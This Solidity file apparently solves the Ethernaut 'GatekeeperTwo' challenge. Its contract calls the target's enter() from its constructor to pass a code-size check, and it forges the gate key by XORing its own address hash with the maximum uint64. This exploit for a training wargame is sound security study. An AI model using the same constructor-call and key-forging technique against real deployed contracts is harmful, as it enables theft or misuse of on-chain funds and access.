// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract HackGatekeeperTwo {
    constructor(GatekeeperTwo _target) {
        uint64 keyAsUint = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        bytes8 key = bytes8(keyAsUint);
        if (!_target.enter(key)) revert();
    }
}
